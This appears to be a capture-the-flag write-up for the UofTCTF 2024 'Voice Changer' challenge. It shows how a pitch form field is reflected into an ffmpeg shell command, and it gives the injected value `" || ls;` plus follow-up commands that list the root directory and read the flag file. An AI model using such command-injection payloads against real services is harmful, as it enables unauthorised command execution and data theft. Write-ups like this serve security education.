---
title: Voice Changer
date: 2024-01-15
tags: 
- web
- command injection
- author-hartmannsyg
categories: UofTCTF 2024
---

solved by {% person hartmannsyg %}

We have a website where we can record our voice, set the pitch and upload it:
<img src="/static/UofTCTF2024/voice_changer.png" alt="" width="500"/>

When we upload a file, we make the following request (I viewed this in Burpsuite):

{% ccb lang:http %}
POST /upload HTTP/1.1
Host: uoftctf-voice-changer.chals.io
Content-Length: 3470
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXBAW2BbbaaD0A1NO
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://uoftctf-voice-changer.chals.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://uoftctf-voice-changer.chals.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Connection: close

------WebKitFormBoundaryXBAW2BbbaaD0A1NO
Content-Disposition: form-data; name="pitch"

1
------WebKitFormBoundaryXBAW2BbbaaD0A1NO
Content-Disposition: form-data; name="input-file"; filename="recording.ogg"
Content-Type: audio/ogg

<audio binary>
{% endccb %}

It responds with:

{% ccb lang:bash wrapped:true terminal:true %}
$ ffmpeg -i "/app/upload/c4d99020-b367-11ee-a08f-779926f969c1.ogg" -y -af "asetrate=44100*1,aresample=44100,atempo=1/1" "/app/output/c4d99020-b367-11ee-a08f-779926f969c1.ogg"

ffmpeg version 6.1 Copyright (c) 2000-2023 the FFmpeg developers
  built with gcc 13.2.1 (Alpine 13.2.1_git20231014) 20231014
  ... a bunch more stuff
{% endccb %}

when we edit the pitch to something else, we see that the pitch gets reflected into the command. So if we set pitch to be `amogus`, it will run:

{% ccb html:true wrapped:true terminal:true %}
$ ffmpeg -i <span class="string">"/app/upload/8e958b80-b368-11ee-a08f-779926f969c1.ogg"</span> -y -af <span class="string">"asetrate=44100*<span class="number">amogus</span>,aresample=44100,atempo=1/<span class="number">amogus</span>"</span> <span class="string">"/app/output/8e958b80-b368-11ee-a08f-779926f969c1.ogg"</span>
{% endccb %}

So if we set pitch to be `" || ls;`

{% ccb html:true wrapped:true terminal:true %}
$ ffmpeg -i <span class="string">"/app/upload/8e958b80-b368-11ee-a08f-779926f969c1.ogg"</span> -y -af <span class="string">"asetrate=44100*<span class="code-segment-highlight">"</span></span><span class="code-segment-highlight"> || <span class="built_in">ls</span>;</span>,aresample=44100,atempo=1/<span class="string"><span class="code-segment-highlight">" || ls;</span>"</span> <span class="string">"/app/output/8e958b80-b368-11ee-a08f-779926f969c1.ogg"</span>

index.js
node_modules
output
package-lock.json
package.json
public
upload
yarn.

ffmpeg version 6.1 Copyright (c) 2000-2023 the FFmpeg developers
  ... a bunch more ffmpeg stuff
{% endccb %}

Nice, we basically got shell, now we just gotta find the flag, though its not in it's directory. Let's try `ls -l /`:

{% ccb terminal:true highlight:14 %}
drwxr-xr-x    1 root     root          4096 Jan 13 05:35 app
drwxr-xr-x    1 root     root          4096 Dec 11 18:37 bin
drwxr-xr-x    5 root     root           360 Jan 14 03:28 dev
drwxr-xr-x    1 root     root          4096 Jan 14 03:28 etc
drwxr-xr-x    1 root     root          4096 Jan 13 05:35 home
drwxr-xr-x    1 root     root          4096 Jan 10 21:25 lib
drwxr-xr-x    5 root     root          4096 Dec  7 09:43 media
drwxr-xr-x    2 root     root          4096 Dec  7 09:43 mnt
drwxr-xr-x    1 root     root          4096 Dec 11 18:37 opt
dr-xr-xr-x  391 nobody   nobody           0 Jan 14 03:28 proc
drwx------    1 root     root          4096 Dec 11 18:37 root
drwxr-xr-x    2 root     root          4096 Dec  7 09:43 run
drwxr-xr-x    1 root     root          4096 Jan 10 21:24 sbin
-rwxr-xr-x    1 root     root            31 Dec 31 04:31 secret.txt
drwxr-xr-x    2 root     root          4096 Dec  7 09:43 srv
dr-xr-xr-x   13 nobody   nobody           0 Jan 14 03:28 sys
drwxrwxrwt    1 root     root          4096 Dec 11 18:37 tmp
drwxr-xr-x    1 root     root          4096 Jan 10 21:25 usr
drwxr-xr-x    1 root     root          4096 Dec  7 09:43 var
{% endccb %}

now if we `cat /secret.txt`:

{% ccb terminal:true %}
uoftctf{Y0UR Pitch IS 70O H!9H}
{% endccb %}